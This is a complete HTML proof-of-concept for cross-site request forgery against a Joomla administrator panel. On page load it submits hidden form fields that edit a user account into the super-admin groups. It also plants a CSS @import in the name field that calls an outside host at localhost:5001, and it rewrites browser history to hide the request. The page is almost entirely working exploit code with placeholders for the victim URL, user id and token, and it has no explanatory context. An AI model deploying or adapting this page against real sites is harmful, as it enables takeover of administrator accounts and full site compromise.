<!DOCTYPE html>
<html>
  <head>
    <title>CSRF poc</title>
    <meta name="referrer" content="no-referrer" />
  </head>
  <body>
    <p>This uses CSRF to get super admin.</p>

    <form
      action="$victim/administrator/index.php?option=com_users&layout=edit&id=$userId"
      method="POST"
      enctype="multipart/form-data"
    >
      <input
        type="hidden"
        name="jform&#91;name&#93;"
        value="x&#123;&#125;&#64;import'http&#58;&#47;&#47;localhost&#58;5001&#47;start'&#59;"
      />
      <input type="hidden" name="jform&#91;username&#93;" value="hacker2" />
      <input type="hidden" name="jform&#91;password&#93;" value="" />
      <input type="hidden" name="jform&#91;password2&#93;" value="" />
      <input
        type="hidden"
        name="jform&#91;email&#93;"
        value="x&#64;psres&#46;net"
      />
      <input
        type="hidden"
        name="jform&#91;registerDate&#93;"
        value="2024&#45;03&#45;22&#32;08&#58;51&#58;12"
      />
      <input
        type="hidden"
        name="jform&#91;lastvisitDate&#93;"
        value="2024&#45;03&#45;22&#32;08&#58;55&#58;47"
      />
      <input type="hidden" name="jform&#91;lastResetTime&#93;" value="" />
      <input type="hidden" name="jform&#91;resetCount&#93;" value="0" />
      <input type="hidden" name="jform&#91;sendEmail&#93;" value="0" />
      <input type="hidden" name="jform&#91;block&#93;" value="0" />
      <input type="hidden" name="jform&#91;requireReset&#93;" value="0" />
      <input type="hidden" name="jform&#91;id&#93;" value="$userId" />
      <input type="hidden" name="jform&#91;groups&#93;&#91;&#93;" value="7" />
      <input type="hidden" name="jform&#91;groups&#93;&#91;&#93;" value="2" />
      <input type="hidden" name="jform&#91;groups&#93;&#91;&#93;" value="8" />
      <input
        type="hidden"
        name="jform&#91;params&#93;&#91;admin&#95;style&#93;"
        value=""
      />
      <input
        type="hidden"
        name="jform&#91;params&#93;&#91;admin&#95;language&#93;"
        value=""
      />
      <input
        type="hidden"
        name="jform&#91;params&#93;&#91;language&#93;"
        value=""
      />
      <input
        type="hidden"
        name="jform&#91;params&#93;&#91;editor&#93;"
        value=""
      />
      <input
        type="hidden"
        name="jform&#91;params&#93;&#91;timezone&#93;"
        value=""
      />
      <input
        type="hidden"
        name="jform&#91;params&#93;&#91;a11y&#95;mono&#93;"
        value="0"
      />
      <input
        type="hidden"
        name="jform&#91;params&#93;&#91;a11y&#95;contrast&#93;"
        value="0"
      />
      <input
        type="hidden"
        name="jform&#91;params&#93;&#91;a11y&#95;highlight&#93;"
        value="0"
      />
      <input
        type="hidden"
        name="jform&#91;params&#93;&#91;a11y&#95;font&#93;"
        value="0"
      />
      <input type="hidden" name="task" value="user&#46;apply" />
      <input type="hidden" name="return" value="" />
      <input type="hidden" name="$token" value="1" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState("", "", "/");
      document.forms[0].submit();
    </script>
  </body>
</html>
